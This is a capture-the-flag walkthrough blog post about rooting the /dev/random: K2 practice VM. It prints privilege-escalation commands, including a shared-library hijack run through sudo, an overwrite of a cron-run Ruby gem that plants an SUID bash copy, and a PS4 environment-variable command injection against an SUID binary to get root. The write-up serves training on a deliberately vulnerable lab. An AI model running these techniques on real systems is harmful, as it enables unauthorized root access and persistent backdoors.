@@ -1,0 +1,292 @@
+
+								
+																		Hack the /dev/random: K2 VM (boot2root Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on September 7, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends! Today we are going to take another CTF challenge known as /dev/random: k2. The credit for making this VM machine goes to “Sagi-” and it is another boot2root challenge in which our goal is to get root to complete the challenge. You can download this VM here.
+We are given the credentials to log in the VM machine (user: password)
+Let us start form getting to know the IP of VM (Here, I have it at 192.168.199.138 but you will have to find your own
+
+		
+		
+			
+			
+			
+			
+netdiscover
+			
+				
+					
+				
+					1
+				
+						netdiscover
+					
+				
+			
+		
+
+
+We use the given credential to log in through ssh. After logging in we check the sudoers list and find that we can run /bin/calc as user “user2”.
+
+		
+		
+			
+			
+			
+			
+ssh user@192.168.199.138
+sudo -l
+			
+				
+					
+				
+					12
+				
+						ssh user@192.168.199.138sudo -l
+					
+				
+			
+		
+
+
+We use strace to debug the binary and if there are missing files or dependencies. We find there is a shared object file missing in /home/user/.config/directory called libcalc.so.
+
+		
+		
+			
+			
+			
+			
+strace /bin/calc 2&gt;&amp;1 | grep -i -E "open|access"
+			
+				
+					
+				
+					1
+				
+						strace /bin/calc 2&gt;&amp;1 | grep -i -E "open|access"
+					
+				
+			
+		
+
+
+We check /home directory and find that the user directory has all permission for the owner only. We give read and execute permission to users in the same group and others. Then we created a directory called .config so that we can create our shared object inside it.
+
+We created a binary that copy’s /bin/bash into /tmp directory, give it suid permission and run it.
+
+We save the file as libcalc.c, then we compile and run the /bin/calc as user2. As soon as we run the application we check the id and find that we have successfully spawned a shell as user2.
+
+		
+		
+			
+			
+			
+			
+gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
+sudo -u user2 /bin/calc
+			
+				
+					
+				
+					12
+				
+						gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.csudo -u user2 /bin/calc
+					
+				
+			
+		
+
+
+After spawning a shell as user2 we try to enumerate the machine and find that there is cronjob that runs a file called /sbin/bckup for user3.
+
+We check the content of this file and find that it is a ruby script that creates a zip file in /tmp/ directory.
+
+We check the zip library of that this ruby is using and find that we can write the file.
+
+We change the content of the file and add that bash command to copy /bin/bash and save it in /tmp/ directory as bash2 and set suid bit.
+
+		
+		
+			
+			
+			
+			
+echo '`cp /bin/bash /tmp/bash2 &amp;&amp; chmod +s /tmp/bash2`’ &gt; /usr/local/share/gems/gems/rubyzip-1.2.1/lib/zip.rb
+			
+				
+					
+				
+					1
+				
+						echo '`cp /bin/bash /tmp/bash2 &amp;&amp; chmod +s /tmp/bash2`’ &gt; /usr/local/share/gems/gems/rubyzip-1.2.1/lib/zip.rb
+					
+				
+			
+		
+
+
+We wait for some time and go to the /tmp/ directory. After changing the directory, we find bash2 has been created by user3. We run the new bash file and successfully spawn a shell as user3.
+
+As we effective user id and not the actually used id of user3. We create a c program that spawns a shell as user3’s uid and gid.
+
+We compile the program and run it. After running the program, we successfully spawn a shell with user3’s uid and gid.
+
+		
+		
+			
+			
+			
+			
+gcc bash3.c -o bash3
+			
+				
+					
+				
+					1
+				
+						gcc bash3.c -o bash3
+					
+				
+			
+		
+
+
+Now we try to find files with suid bit set and find a file called “whoisme” is “/usr/bin/local/” directory.
+
+		
+		
+			
+			
+			
+			
+find / -perm -4000 2&gt;/dev/null
+			
+				
+					
+				
+					1
+				
+						find / -perm -4000 2&gt;/dev/null
+					
+				
+			
+		
+
+
+When we run the file it outputs the string “user”. When we check the binary file with strings command we find that it runs setuid, system, setgid and log name command.
+
+We run by ignoring the environment we use PS4 variable to copy /bin/bash in /tmp/ directory as bash4 and change the ownership to root and set suid bit and run it along the binary file.
+
+		
+		
+			
+			
+			
+			
+env -i SHELLOPTS=xstrace PS4=’$(cp /bin/bash /tmp/bash4 &amp;&amp; chown root.root /tmp/bash4 &amp;&amp; chmod +s /tmp/bash4)’ /bin/sh -c  ‘/usr/local/bin/whoisme’
+			
+				
+					
+				
+					1
+				
+						env -i SHELLOPTS=xstrace PS4=’$(cp /bin/bash /tmp/bash4 &amp;&amp; chown root.root /tmp/bash4 &amp;&amp; chmod +s /tmp/bash4)’ /bin/sh -c  ‘/usr/local/bin/whoisme’
+					
+				
+			
+		
+
+
+As soon as we run the file we find our copied bash file. We run the file and spawn a shell as a root user. We go to the root directory and a file called flag.txt.
+
+We take a look at the content of the file and find our congratulatory flag.
+
+Author: Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
